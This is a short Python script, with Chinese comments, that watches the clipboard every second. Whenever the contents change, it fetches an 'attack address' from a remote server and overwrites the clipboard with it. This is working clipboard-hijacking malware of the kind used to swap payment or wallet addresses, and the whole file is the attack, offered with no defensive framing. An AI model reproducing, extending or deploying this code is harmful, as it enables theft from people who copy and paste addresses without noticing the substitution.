import requests
import pyperclip
import time

SERVER_URL = "https://xdress.onrender.com/get_target_address"

def get_target_address():
    """
    从云服务获取攻击地址。
    """
    try:
        response = requests.get(SERVER_URL)
        if response.status_code == 200:
            return response.json().get("attack_address")
    except Exception as e:
        print(f"Failed to get target address: {e}")
    return None

def monitor_clipboard():
    """
    监控剪贴板内容并替换。
    """
    last_content = ""
    while True:
        try:
            current_content = pyperclip.paste()
            if current_content != last_content:
                print(f"Clipboard changed: {current_content}")  # For Debug
                attack_address = get_target_address()
                if attack_address:
                    pyperclip.copy(attack_address)  # 替换剪贴板内容
                    print(f"Replaced with: {attack_address}")  # For Debug
                last_content = current_content
        except Exception as e:
            print(f"Clipboard monitoring error: {e}")
        time.sleep(1)

if __name__ == "__main__":

    monitor_clipboard()
